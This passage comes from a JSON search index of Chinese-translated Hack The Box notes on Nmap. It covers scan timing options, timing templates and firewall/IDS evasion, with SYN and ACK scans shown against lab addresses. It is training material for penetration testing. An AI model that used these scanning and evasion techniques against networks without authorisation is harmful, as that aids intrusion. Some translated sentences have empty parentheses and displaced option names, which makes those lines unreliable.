&lt;time&gt;</code>)\u3001\u5e94\u8be5\u540c\u65f6\u53d1\u9001\u591a\u5c11\u6570\u636e\u5305 ( ) \u4ee5\u53ca\u88ab\u626b\u63cf\u7aef\u53e3\u7684<code>--min-rate &lt;number&gt;</code>\u91cd\u8bd5\u6b21\u6570 ( )<code>--max-retries &lt;number&gt;</code>\u5e94\u8be5\u626b\u63cf\u76ee\u6807\u3002</p>"},{"location":"CheetSheet/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_28","title":"\u8d85\u65f6","text":"<p>\u5f53 Nmap \u53d1\u9001\u6570\u636e\u5305\u65f6\uff0c\u9700\u8981\u4e00\u4e9b\u65f6\u95f4 ( <code>Round-Trip-Time</code>- <code>RTT</code>) \u624d\u80fd\u4ece\u626b\u63cf\u7684\u7aef\u53e3\u63a5\u6536\u5230\u54cd\u5e94\u3002\u901a\u5e38\uff0c<code>Nmap</code>\u4ee5 100 \u6beb\u79d2\u7684\u9ad8\u8d85\u65f6 ( <code>--min-RTT-timeout</code>) \u5f00\u59cb\u3002\u8ba9\u6211\u4eec\u6765\u770b\u4e00\u4e2a\u793a\u4f8b\uff0c\u626b\u63cf\u5177\u6709 256 \u53f0\u4e3b\u673a\u7684\u6574\u4e2a\u7f51\u7edc\uff0c\u5305\u62ec\u524d 100 \u4e2a\u7aef\u53e3\u3002</p>"},{"location":"CheetSheet/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_29","title":"\u9ed8\u8ba4\u626b\u63cf","text":"<p>\u9ed8\u8ba4\u626b\u63cf</p> <pre><code>darkinga@htb[/htb]$ sudo nmap 10.129.2.0/24 -F\n\n&lt;SNIP&gt;\nNmap done: 256 IP addresses (10 hosts up) scanned in 39.44 seconds\n</code></pre>"},{"location":"CheetSheet/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#rtt","title":"\u4f18\u5316 RTT","text":"<p>\u4f18\u5316 RTT</p> <pre><code>darkinga@htb[/htb]$ sudo nmap 10.129.2.0/24 -F --initial-rtt-timeout 50ms --max-rtt-timeout 100ms\n\n&lt;SNIP&gt;\nNmap done: 256 IP addresses (8 hosts up) scanned in 12.29 seconds\n</code></pre> \u626b\u63cf\u9009\u9879 \u63cf\u8ff0 <code>10.129.2.0/24</code> \u626b\u63cf\u6307\u5b9a\u7684\u76ee\u6807\u7f51\u7edc\u3002 <code>-F</code> \u626b\u63cf\u524d 100 \u4e2a\u7aef\u53e3\u3002 <code>--initial-rtt-timeout 50ms</code> \u5c06\u6307\u5b9a\u7684\u65f6\u95f4\u503c\u8bbe\u7f6e\u4e3a\u521d\u59cb RTT \u8d85\u65f6\u3002 <code>--max-rtt-timeout 100ms</code> \u5c06\u6307\u5b9a\u7684\u65f6\u95f4\u503c\u8bbe\u7f6e\u4e3a\u6700\u5927 RTT \u8d85\u65f6\u3002 <p>\u6bd4\u8f83\u4e24\u6b21\u626b\u63cf\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u4f18\u5316\u626b\u63cf\u5c11\u627e\u5230\u4e24\u53f0\u4e3b\u673a\uff0c\u4f46\u626b\u63cf\u53ea\u7528\u4e86\u56db\u5206\u4e4b\u4e00\u7684\u65f6\u95f4\u3002\u7531\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u51fa\u7ed3\u8bba\uff0c\u5c06\u521d\u59cb RTT \u8d85\u65f6 ( <code>--initial-rtt-timeout</code>) \u8bbe\u7f6e\u5f97\u592a\u77ed\u53ef\u80fd\u4f1a\u5bfc\u81f4\u6211\u4eec\u5ffd\u7565\u4e3b\u673a\u3002</p>"},{"location":"CheetSheet/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_30","title":"\u6700\u5927\u91cd\u8bd5\u6b21\u6570","text":"<p>\u53e6\u4e00\u79cd\u63d0\u9ad8\u626b\u63cf\u901f\u5ea6\u7684\u65b9\u6cd5\u662f\u6307\u5b9a\u53d1\u9001\u6570\u636e\u5305\u7684\u91cd\u8bd5\u7387 ( <code>--max-retries</code>)\u3002\u91cd\u8bd5\u7387\u7684\u9ed8\u8ba4\u503c\u4e3a<code>10</code>\uff0c\u56e0\u6b64\u5982\u679c<code>Nmap</code>\u6ca1\u6709\u6536\u5230\u7aef\u53e3\u7684\u54cd\u5e94\uff0c\u5b83\u5c06\u4e0d\u518d\u5411\u8be5\u7aef\u53e3\u53d1\u9001\u4efb\u4f55\u6570\u636e\u5305\u5e76\u5c06\u88ab\u8df3\u8fc7\u3002</p>"},{"location":"CheetSheet/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_31","title":"\u9ed8\u8ba4\u626b\u63cf","text":"<p>\u9ed8\u8ba4\u626b\u63cf</p> <pre><code>darkinga@htb[/htb]$ sudo nmap 10.129.2.0/24 -F | grep \"/tcp\" | wc -l\n\n23\n</code></pre>"},{"location":"CheetSheet/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_32","title":"\u51cf\u5c11\u91cd\u8bd5","text":"<p>\u51cf\u5c11\u91cd\u8bd5</p> <pre><code>darkinga@htb[/htb]$ sudo nmap 10.129.2.0/24 -F --max-retries 0 | grep \"/tcp\" | wc -l\n\n21\n</code></pre> \u626b\u63cf\u9009\u9879 \u63cf\u8ff0 <code>10.129.2.0/24</code> \u626b\u63cf\u6307\u5b9a\u7684\u76ee\u6807\u7f51\u7edc\u3002 <code>-F</code> \u626b\u63cf\u524d 100 \u4e2a\u7aef\u53e3\u3002 <code>--max-retries 0</code> \u8bbe\u7f6e\u5c06\u5728\u626b\u63cf\u671f\u95f4\u6267\u884c\u7684\u91cd\u8bd5\u6b21\u6570\u3002 <p>\u540c\u6837\uff0c\u6211\u4eec\u8ba4\u8bc6\u5230\u52a0\u901f\u4e5f\u4f1a\u5bf9\u6211\u4eec\u7684\u7ed3\u679c\u4ea7\u751f\u8d1f\u9762\u5f71\u54cd\uff0c\u8fd9\u610f\u5473\u7740\u6211\u4eec\u53ef\u80fd\u4f1a\u5ffd\u7565\u91cd\u8981\u4fe1\u606f\u3002</p>"},{"location":"CheetSheet/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_33","title":"\u8d39\u7387","text":"<p>\u5728\u767d\u76d2\u6e17\u900f\u6d4b\u8bd5\u4e2d\uff0c\u6211\u4eec\u53ef\u80fd\u4f1a\u83b7\u5f97\u5b89\u5168\u7cfb\u7edf\u7684\u767d\u540d\u5355\uff0c\u4ee5\u68c0\u67e5\u7f51\u7edc\u4e2d\u7684\u7cfb\u7edf\u662f\u5426\u5b58\u5728\u6f0f\u6d1e\uff0c\u800c\u4e0d\u4ec5\u4ec5\u662f\u6d4b\u8bd5\u4fdd\u62a4\u63aa\u65bd\u3002\u5982\u679c\u6211\u4eec\u77e5\u9053\u7f51\u7edc\u5e26\u5bbd\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u53d1\u9001\u6570\u636e\u5305\u7684\u901f\u7387\uff0c\u8fd9\u4f1a\u663e\u7740\u52a0\u5feb\u6211\u4eec\u4f7f\u7528<code>Nmap</code>. \u5728\u8bbe\u7f6e\u53d1\u9001\u6570\u636e\u5305\u7684\u6700\u5c0f\u901f\u7387 ( <code>--min-rate &lt;number&gt;</code>) \u65f6\uff0c\u6211\u4eec\u544a\u8bc9<code>Nmap</code>\u540c\u65f6\u53d1\u9001\u6307\u5b9a\u6570\u91cf\u7684\u6570\u636e\u5305\u3002\u5b83\u5c06\u5c1d\u8bd5\u76f8\u5e94\u5730\u7ef4\u6301\u901f\u7387\u3002</p>"},{"location":"CheetSheet/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_34","title":"\u9ed8\u8ba4\u626b\u63cf","text":"<p>\u9ed8\u8ba4\u626b\u63cf</p> <pre><code>darkinga@htb[/htb]$ sudo nmap 10.129.2.0/24 -F -oN tnet.default\n\n&lt;SNIP&gt;\nNmap done: 256 IP addresses (10 hosts up) scanned in 29.83 seconds\n</code></pre>"},{"location":"CheetSheet/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_35","title":"\u4f18\u5316\u626b\u63cf","text":"<p>\u4f18\u5316\u626b\u63cf</p> <pre><code>darkinga@htb[/htb]$ sudo nmap 10.129.2.0/24 -F -oN tnet.minrate300 --min-rate 300\n\n&lt;SNIP&gt;\nNmap done: 256 IP addresses (10 hosts up) scanned in 8.67 seconds\n</code></pre> \u626b\u63cf\u9009\u9879 \u63cf\u8ff0 <code>10.129.2.0/24</code> \u626b\u63cf\u6307\u5b9a\u7684\u76ee\u6807\u7f51\u7edc\u3002 <code>-F</code> \u626b\u63cf\u524d 100 \u4e2a\u7aef\u53e3\u3002 <code>-oN tnet.minrate300</code> \u4ee5\u666e\u901a\u683c\u5f0f\u4fdd\u5b58\u7ed3\u679c\uff0c\u4ece\u6307\u5b9a\u7684\u6587\u4ef6\u540d\u5f00\u59cb\u3002 <code>--min-rate 300</code> \u8bbe\u7f6e\u5c06\u540c\u65f6\u53d1\u9001\u7684\u6570\u636e\u5305\u6570\u3002"},{"location":"CheetSheet/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#-","title":"\u9ed8\u8ba4\u626b\u63cf - \u627e\u5230\u6253\u5f00\u7684\u7aef\u53e3","text":"<p>\u9ed8\u8ba4\u626b\u63cf - \u627e\u5230\u6253\u5f00\u7684\u7aef\u53e3</p> <pre><code>darkinga@htb[/htb]$ cat tnet.default | grep \"/tcp\" | wc -l\n\n23\n</code></pre>"},{"location":"CheetSheet/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#-_1","title":"\u4f18\u5316\u626b\u63cf - \u627e\u5230\u5f00\u653e\u7aef\u53e3","text":"<p>\u4f18\u5316\u626b\u63cf - \u627e\u5230\u5f00\u653e\u7aef\u53e3</p> <pre><code>darkinga@htb[/htb]$ cat tnet.minrate300 | grep \"/tcp\" | wc -l\n\n23\n</code></pre>"},{"location":"CheetSheet/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_36","title":"\u5b9a\u65f6","text":"<p>\u56e0\u4e3a\u8fd9\u6837\u7684\u8bbe\u7f6e\u4e0d\u80fd\u603b\u662f\u624b\u52a8\u4f18\u5316\uff0c\u5c31\u50cf\u5728\u9ed1\u76d2\u6e17\u900f\u6d4b\u8bd5\u4e2d\u4e00\u6837\uff0c<code>Nmap</code>\u63d0\u4f9b\u4e86\u516d\u79cd\u4e0d\u540c\u7684\u65f6\u95f4\u6a21\u677f ( <code>-T &lt;0-5&gt;</code>) \u4f9b\u6211\u4eec\u4f7f\u7528\u3002\u8fd9\u4e9b\u503c ( <code>0-5</code>) \u51b3\u5b9a\u4e86\u6211\u4eec\u626b\u63cf\u7684\u79ef\u6781\u6027\u3002\u5982\u679c\u626b\u63cf\u8fc7\u4e8e\u6fc0\u8fdb\uff0c\u8fd9\u4e5f\u4f1a\u4ea7\u751f\u8d1f\u9762\u5f71\u54cd\uff0c\u5e76\u4e14\u5b89\u5168\u7cfb\u7edf\u53ef\u80fd\u4f1a\u7531\u4e8e\u4ea7\u751f\u7684\u7f51\u7edc\u6d41\u91cf\u800c\u963b\u6b62\u6211\u4eec\u3002\u5f53\u6211\u4eec\u6ca1\u6709\u5b9a\u4e49\u4efb\u4f55\u5176\u4ed6\u5185\u5bb9\u65f6\u4f7f\u7528\u7684\u9ed8\u8ba4\u65f6\u5e8f\u6a21\u677f\u662f\u6b63\u5e38\u7684 ( <code>-T 3</code>)\u3002</p> <ul> <li><code>-T 0</code> / <code>-T paranoid</code></li> <li><code>-T 1</code>/<code>-T sneaky</code></li> <li><code>-T 2</code>/<code>-T polite</code></li> <li><code>-T 3</code>/<code>-T normal</code></li> <li><code>-T 4</code>/<code>-T aggressive</code></li> <li><code>-T 5</code>/<code>-T insane</code></li> </ul> <p>\u8fd9\u4e9b\u6a21\u677f\u5305\u542b\u6211\u4eec\u4e5f\u53ef\u4ee5\u624b\u52a8\u8bbe\u7f6e\u7684\u9009\u9879\uff0c\u5e76\u4e14\u5df2\u7ecf\u770b\u5230\u4e86\u5176\u4e2d\u7684\u4e00\u4e9b\u3002\u5f00\u53d1\u4eba\u5458\u6839\u636e\u5176\u6700\u4f73\u7ed3\u679c\u786e\u5b9a\u4e3a\u8fd9\u4e9b\u6a21\u677f\u8bbe\u7f6e\u7684\u503c\uff0c\u4f7f\u6211\u4eec\u66f4\u5bb9\u6613\u4f7f\u6211\u4eec\u7684\u626b\u63cf\u9002\u5e94\u76f8\u5e94\u7684\u7f51\u7edc\u73af\u5883\u3002\u6211\u4eec\u53ef\u4ee5\u5728\u8fd9\u91cc\u627e\u5230\u786e\u5207\u4f7f\u7528\u7684\u9009\u9879\u53ca\u5176\u503c\uff1ahttps ://nmap.org/book/performance-timing-templates.html</p>"},{"location":"CheetSheet/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_37","title":"\u9ed8\u8ba4\u626b\u63cf","text":"<p>\u9ed8\u8ba4\u626b\u63cf</p> <pre><code>darkinga@htb[/htb]$ sudo nmap 10.129.2.0/24 -F -oN tnet.default \n\n&lt;SNIP&gt;\nNmap done: 256 IP addresses (10 hosts up) scanned in 32.44 seconds\n</code></pre>"},{"location":"CheetSheet/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_38","title":"\u75af\u72c2\u626b\u63cf","text":"<p>\u75af\u72c2\u626b\u63cf</p> <pre><code>darkinga@htb[/htb]$ sudo nmap 10.129.2.0/24 -F -oN tnet.T5 -T 5\n\n&lt;SNIP&gt;\nNmap done: 256 IP addresses (10 hosts up) scanned in 18.07 seconds\n</code></pre> \u626b\u63cf\u9009\u9879 \u63cf\u8ff0 <code>10.129.2.0/24</code> \u626b\u63cf\u6307\u5b9a\u7684\u76ee\u6807\u7f51\u7edc\u3002 <code>-F</code> \u626b\u63cf\u524d 100 \u4e2a\u7aef\u53e3\u3002 <code>-oN tnet.T5</code> \u4ee5\u666e\u901a\u683c\u5f0f\u4fdd\u5b58\u7ed3\u679c\uff0c\u4ece\u6307\u5b9a\u7684\u6587\u4ef6\u540d\u5f00\u59cb\u3002 <code>-T 5</code> \u6307\u5b9a\u75af\u72c2\u8ba1\u65f6\u6a21\u677f\u3002"},{"location":"CheetSheet/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#-_2","title":"\u9ed8\u8ba4\u626b\u63cf - \u627e\u5230\u6253\u5f00\u7684\u7aef\u53e3","text":"<p>\u9ed8\u8ba4\u626b\u63cf - \u627e\u5230\u6253\u5f00\u7684\u7aef\u53e3</p> <pre><code>darkinga@htb[/htb]$ cat tnet.default | grep \"/tcp\" | wc -l\n\n23\n</code></pre>"},{"location":"CheetSheet/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#-_3","title":"\u75af\u72c2\u626b\u63cf - \u53d1\u73b0\u5f00\u653e\u7aef\u53e3","text":"<p>\u75af\u72c2\u626b\u63cf - \u53d1\u73b0\u5f00\u653e\u7aef\u53e3</p> <pre><code>darkinga@htb[/htb]$ cat tnet.T5 | grep \"/tcp\" | wc -l\n\n23\n</code></pre> <p>\u6211\u4eec\u53ef\u4ee5\u5728https://nmap.org/book/man-performance.html\u627e\u5230\u6709\u5173\u626b\u63cf\u6027\u80fd\u7684\u66f4\u591a\u4fe1\u606f</p>"},{"location":"CheetSheet/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_39","title":"\u7ed5\u8fc7\u5b89\u5168\u63aa\u65bd","text":""},{"location":"CheetSheet/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#idsips","title":"\u9632\u706b\u5899\u548c IDS/IPS \u89c4\u907f","text":"<p><code>Nmap</code>\u4e3a\u6211\u4eec\u63d0\u4f9b\u4e86\u8bb8\u591a\u4e0d\u540c\u7684\u65b9\u6cd5\u6765\u7ed5\u8fc7\u9632\u706b\u5899\u89c4\u5219\u548c IDS/IPS\u3002\u8fd9\u4e9b\u65b9\u6cd5\u5305\u62ec\u6570\u636e\u5305\u5206\u6bb5\u3001\u8bf1\u9975\u7684\u4f7f\u7528\u4ee5\u53ca\u6211\u4eec\u5c06\u5728\u672c\u8282\u4e2d\u8ba8\u8bba\u7684\u5176\u4ed6\u65b9\u6cd5\u3002</p>"},{"location":"CheetSheet/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_40","title":"\u9632\u706b\u5899","text":"<p>\u9632\u706b\u5899\u662f\u4e00\u79cd\u9632\u6b62\u6765\u81ea\u5916\u90e8\u7f51\u7edc\u7684\u672a\u6388\u6743\u8fde\u63a5\u5c1d\u8bd5\u7684\u5b89\u5168\u63aa\u65bd\u3002\u6bcf\u4e2a\u9632\u706b\u5899\u5b89\u5168\u7cfb\u7edf\u90fd\u57fa\u4e8e\u4e00\u4e2a\u8f6f\u4ef6\u7ec4\u4ef6\uff0c\u8be5\u7ec4\u4ef6\u76d1\u89c6\u9632\u706b\u5899\u548c\u4f20\u5165\u6570\u636e\u8fde\u63a5\u4e4b\u95f4\u7684\u7f51\u7edc\u6d41\u91cf\uff0c\u5e76\u6839\u636e\u5df2\u8bbe\u7f6e\u7684\u89c4\u5219\u51b3\u5b9a\u5982\u4f55\u5904\u7406\u8fde\u63a5\u3002\u5b83\u68c0\u67e5\u5355\u4e2a\u7f51\u7edc\u6570\u636e\u5305\u662f\u5426\u88ab\u4f20\u9012\u3001\u5ffd\u7565\u6216\u963b\u6b62\u3002\u6b64\u673a\u5236\u65e8\u5728\u9632\u6b62\u53ef\u80fd\u5177\u6709\u6f5c\u5728\u5371\u9669\u7684\u4e0d\u9700\u8981\u7684\u8fde\u63a5\u3002</p>"},{"location":"CheetSheet/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#ips","title":"\u5165\u4fb5\u68c0\u6d4b\u7cfb\u7edf/IPS","text":"<p>\u4e0e\u9632\u706b\u5899\u4e00\u6837\uff0c\u5165\u4fb5\u68c0\u6d4b\u7cfb\u7edf\uff08<code>IDS</code>\uff09\u548c\u5165\u4fb5\u9632\u5fa1\u7cfb\u7edf\uff08<code>IPS</code>\uff09\u4e5f\u662f\u57fa\u4e8e\u8f6f\u4ef6\u7684\u7ec4\u4ef6\u3002<code>IDS</code>\u626b\u63cf\u7f51\u7edc\u4ee5\u5bfb\u627e\u6f5c\u5728\u7684\u653b\u51fb\uff0c\u5bf9\u5176\u8fdb\u884c\u5206\u6790\uff0c\u5e76\u62a5\u544a\u68c0\u6d4b\u5230\u7684\u4efb\u4f55\u653b\u51fb\u3002\u5982\u679c\u5e94\u8be5\u68c0\u6d4b\u5230\u6f5c\u5728\u7684\u653b\u51fb\uff0c\u5219\u91c7\u53d6\u7279\u5b9a\u7684\u9632\u5fa1\u63aa\u65bd\u4f5c\u4e3a<code>IPS</code>\u8865\u5145\u3002<code>IDS</code>\u6b64\u7c7b\u653b\u51fb\u7684\u5206\u6790\u57fa\u4e8e\u6a21\u5f0f\u5339\u914d\u548c\u7b7e\u540d\u3002\u5982\u679c\u68c0\u6d4b\u5230\u7279\u5b9a\u6a21\u5f0f\uff0c\u4f8b\u5982\u670d\u52a1\u68c0\u6d4b\u626b\u63cf\uff0c<code>IPS</code>\u53ef\u80fd\u4f1a\u963b\u6b62\u6302\u8d77\u7684\u8fde\u63a5\u5c1d\u8bd5\u3002</p>"},{"location":"CheetSheet/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_41","title":"\u786e\u5b9a\u9632\u706b\u5899\u53ca\u5176\u89c4\u5219","text":"<p>\u6211\u4eec\u5df2\u7ecf\u77e5\u9053\uff0c\u5f53\u7aef\u53e3\u663e\u793a\u4e3a\u5df2\u8fc7\u6ee4\u65f6\uff0c\u53ef\u80fd\u6709\u591a\u79cd\u539f\u56e0\u3002\u5728\u5927\u591a\u6570\u60c5\u51b5\u4e0b\uff0c\u9632\u706b\u5899\u8bbe\u7f6e\u4e86\u7279\u5b9a\u7684\u89c4\u5219\u6765\u5904\u7406\u7279\u5b9a\u7684\u8fde\u63a5\u3002\u6570\u636e\u5305\u53ef\u4ee5\u662f<code>dropped</code>, \u6216<code>rejected</code>\u3002\u6570\u636e<code>dropped</code>\u5305\u88ab\u5ffd\u7565\uff0c\u4e3b\u673a\u4e0d\u8fd4\u56de\u4efb\u4f55\u54cd\u5e94\u3002</p> <p>\u8fd9\u5bf9\u4e8e<code>rejected</code>\u8fd4\u56de\u5e26\u6709<code>RST</code>\u6807\u5fd7\u7684\u6570\u636e\u5305\u662f\u4e0d\u540c\u7684\u3002\u8fd9\u4e9b\u6570\u636e\u5305\u5305\u542b\u4e0d\u540c\u7c7b\u578b\u7684 ICMP \u9519\u8bef\u4ee3\u7801\u6216\u6839\u672c\u4e0d\u5305\u542b\u4efb\u4f55\u5185\u5bb9\u3002</p> <p>\u6b64\u7c7b\u9519\u8bef\u53ef\u80fd\u662f\uff1a</p> <ul> <li>\u7f51\u7edc\u4e0d\u53ef\u8fbe</li> <li>\u7f51\u7edc\u7981\u6b62</li> <li>\u4e3b\u673a\u4e0d\u53ef\u8fbe</li> <li>\u4e3b\u673a\u7981\u6b62</li> <li>\u7aef\u53e3\u4e0d\u53ef\u8fbe</li> <li>\u539f\u578b\u65e0\u6cd5\u8bbf\u95ee</li> </ul> <p>Nmap \u7684 TCP ACK \u626b\u63cf ( ) \u65b9\u6cd5\u6bd4\u5e38\u89c4 SYN ( ) \u6216\u8fde\u63a5\u626b\u63cf ( )<code>-sA</code>\u66f4\u96be\u8fc7\u6ee4\u9632\u706b\u5899\u548c IDS/IPS \u7cfb\u7edf\uff0c\u56e0\u4e3a\u5b83\u4eec\u53ea\u53d1\u9001\u5e26\u6709\u6807\u5fd7\u7684 TCP \u6570\u636e\u5305\u3002\u5f53\u7aef\u53e3\u5173\u95ed\u6216\u6253\u5f00\u65f6\uff0c\u4e3b\u673a\u5fc5\u987b\u54cd\u5e94\u4e00\u4e2a\u6807\u5fd7\u3002\u4e0e\u4f20\u51fa\u8fde\u63a5\u4e0d\u540c\uff0c\u6765\u81ea\u5916\u90e8\u7f51\u7edc\u7684\u6240\u6709\u8fde\u63a5\u5c1d\u8bd5\uff08\u5e26\u6709\u6807\u5fd7\uff09\u901a\u5e38\u90fd\u88ab\u9632\u706b\u5899\u963b\u6b62\u3002\u4f46\u662f\uff0c\u5e26\u6709\u6807\u5fd7\u7684\u6570\u636e\u5305\u5f80\u5f80\u4f1a\u88ab\u9632\u706b\u5899\u901a\u8fc7\uff0c\u56e0\u4e3a\u9632\u706b\u5899\u65e0\u6cd5\u786e\u5b9a\u8fde\u63a5\u9996\u5148\u662f\u4ece\u5916\u90e8\u7f51\u7edc\u8fd8\u662f\u5185\u90e8\u7f51\u7edc\u5efa\u7acb\u7684\u3002<code>-sS``sT``ACK``RST``SYN``ACK</code></p> <p>\u5982\u679c\u6211\u4eec\u67e5\u770b\u8fd9\u4e9b\u626b\u63cf\uff0c\u6211\u4eec\u5c06\u770b\u5230\u7ed3\u679c\u6709\u4f55\u4e0d\u540c\u3002</p>"},{"location":"CheetSheet/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_42","title":"\u540c\u6b65\u626b\u63cf","text":"<p>\u540c\u6b65\u626b\u63cf</p> <pre><code>darkinga@htb[/htb]$ sudo nmap 10.129.2.28 -p 21,22,25 -sS -Pn -n --disable-arp-ping --packet-trace\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-21 14:56 CEST\nSENT (0.0278s) TCP 10.10.14.2:57347 &gt; 10.129.2.28:22 S ttl=53 id=22412 iplen=44  seq=4092255222 win=1024 &lt;mss 1460&gt;\nSENT (0.0278s) TCP 10.10.14.2:57347 &gt; 10.129.2.28:25 S ttl=50 id=62291 iplen=44  seq=4092255222 win=1024 &lt;mss 1460&gt;\nSENT (0.0278s) TCP 10.10.14.2:57347 &gt; 10.129.2.28:21 S ttl=58 id=38696 iplen=44  seq=4092255222 win=1024 &lt;mss 1460&gt;\nRCVD (0.0329s) ICMP [10.129.2.28 &gt; 10.10.14.2 Port 21 unreachable (type=3/code=3) ] IP [ttl=64 id=40884 iplen=72 ]\nRCVD (0.0341s) TCP 10.129.2.28:22 &gt; 10.10.14.2:57347 SA ttl=64 id=0 iplen=44  seq=1153454414 win=64240 &lt;mss 1460&gt;\nRCVD (1.0386s) TCP 10.129.2.28:22 &gt; 10.10.14.2:57347 SA ttl=64 id=0 iplen=44  seq=1153454414 win=64240 &lt;mss 1460&gt;\nSENT (1.1366s) TCP 10.10.14.2:57348 &gt; 10.129.2.28:25 S ttl=44 id=6796 iplen=44  seq=4092320759 win=1024 &lt;mss 1460&gt;\nNmap scan report for 10.129.2.28\nHost is up (0.0053s latency).\n\nPORT   STATE    SERVICE\n21/tcp filtered ftp\n22/tcp open     ssh\n25/tcp filtered smtp\nMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)\n\nNmap done: 1 IP address (1 host up) scanned in 0.07 seconds\n</code></pre>"},{"location":"CheetSheet/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_43","title":"\u786e\u8ba4\u626b\u63cf","text":"<p>\u786e\u8ba4\u626b\u63cf</p> <pre><code>darkinga@htb[/htb]$ sudo nmap 10.129.2.28 -p 21,22,25 -sA -Pn -n --disable-arp-ping --packet-trace\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-21 14:57 CEST\nSENT (0.0422s) TCP 10.10.14.2:49343 &gt; 10.129.2.28:21 A ttl=49 id=12381 iplen=40  seq=0 win=1024\nSENT (0.0423s) TCP 10.10.14.2:49343 &gt; 10.129.2.28:22 A ttl=41 id=5146 iplen=40  seq=0 win=1024\nSENT (0.0423s) TCP 10.10.14.2:49343 &gt; 10.129.2.28:25 A ttl=49 id=5800 iplen=40  seq=0 win=1024\nRCVD (0.1252s) ICMP [10.129.2.28 &gt; 10.10.14.2 Port 21 unreachable (type=3/code=3) ] IP [ttl=64 id=55628 iplen=68 ]\nRCVD (0.1268s) TCP 10.129.2.28:22 &gt; 10.10.14.2:49343 R ttl=64 id=0 iplen=40  seq=1660784500 win=0\nSENT (1.3837s) TCP 10.10.14.2:49344 &gt; 10.129.2.28:25 A ttl=59 id=21915 iplen=40  seq=0 win=1024\nNmap scan report for 10.129.2.28\nHost is up (0.083s latency).\n\nPORT   STATE      SERVICE\n21/tcp filtered   ftp\n22/tcp unfiltered ssh\n25/tcp filtered   smtp\nMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)\n\nNmap done: 1 IP address (1 host up) scanned in 0.15 seconds\n</code></pre> \u626b\u63cf\u9009\u9879 \u63cf\u8ff0 <code>10.129.2.28</code> \u626b\u63cf\u6307\u5b9a\u76ee\u6807\u3002 <code>-p 21,22,25</code> \u53ea\u626b\u63cf\u6307\u5b9a\u7684\u7aef\u53e3\u3002 <code>-sS</code> \u5728\u6307\u5b9a\u7aef\u53e3\u4e0a\u6267\u884c SYN \u626b\u63cf\u3002 <code>-sA</code> \u5bf9\u6307\u5b9a\u7aef\u53e3\u6267\u884c ACK \u626b\u63cf\u3002 <code>-Pn</code> \u7981\u7528 ICMP Echo \u8bf7\u6c42\u3002 <code>-n</code> \u7981\u7528 DNS \u89e3\u6790\u3002 <code>--disable-arp-ping</code> \u7981\u7528 ARP ping\u3002 <code>--packet-trace</code> \u663e\u793a\u6240\u6709\u53d1\u9001\u548c\u63a5\u6536\u7684\u6570\u636e\u5305\u3002 <p>\u8bf7\u6ce8\u610f\u6211\u4eec\u4ece\u76ee\u6807\u6536\u5230\u7684 RCVD \u6570\u636e\u5305\u53ca\u5176\u8bbe\u7f6e\u6807\u5fd7\u3002\u4f7f\u7528 SYN \u626b\u63cf ( <code>-sS</code>)\uff0c\u6211\u4eec\u7684\u76ee\u6807\u5c1d\u8bd5\u901a\u8fc7\u53d1\u9001\u56de<code>SA</code>\u8bbe\u7f6e\u4e86 SYN-ACK () \u6807\u5fd7\u7684\u6570\u636e\u5305\u6765\u5efa\u7acb TCP \u8fde\u63a5\uff0c\u800c\u4f7f\u7528 ACK \u626b\u63cf 